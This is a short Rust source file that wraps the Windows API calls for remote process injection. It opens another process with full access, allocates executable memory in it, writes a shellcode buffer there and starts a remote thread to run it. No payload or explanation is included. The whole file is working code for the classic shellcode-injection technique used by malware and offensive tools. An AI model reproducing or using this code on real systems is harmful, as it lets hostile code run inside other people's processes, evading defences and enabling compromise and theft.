use std::os::raw::c_void;
use windows::Win32::Foundation::HANDLE;
use windows::Win32::System::Threading::{CreateRemoteThread, OpenProcess, LPTHREAD_START_ROUTINE, PROCESS_ALL_ACCESS};
use windows::core::Error;
use windows::Win32::System::Memory::{VirtualAllocEx,MEM_COMMIT,MEM_RESERVE,PAGE_EXECUTE_READWRITE};
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;

pub unsafe fn open_process(id:&u32)->Result<HANDLE,Error>{
    let desired_access = PROCESS_ALL_ACCESS;
    let result = OpenProcess(desired_access, false, *id)?;
    Ok(result)
}
pub unsafe fn allocate_memory(handle:&HANDLE,dwsize:&usize)-> *mut c_void {
    let lpaddress:Option<*const c_void> = None;
    let flallocationtype = MEM_COMMIT | MEM_RESERVE;
    let flprotect = PAGE_EXECUTE_READWRITE;
    let address = VirtualAllocEx(*handle, lpaddress, *dwsize, flallocationtype, flprotect);
    address

}

pub unsafe fn write_in_memory(handle:&HANDLE,addr:*mut c_void,shellcode:*const c_void,nsize:&usize)-> Result<(), Error> {
    let success = WriteProcessMemory(*handle, addr, shellcode, *nsize, None)?;
    Ok(success)
}

pub unsafe fn create_thread_execution(handle:&HANDLE,startaddress:LPTHREAD_START_ROUTINE)-> Result<HANDLE, Error>{
    let thread_handle= CreateRemoteThread(*handle, None, 0,
        startaddress, None, 0, None)?;
        Ok(thread_handle)

}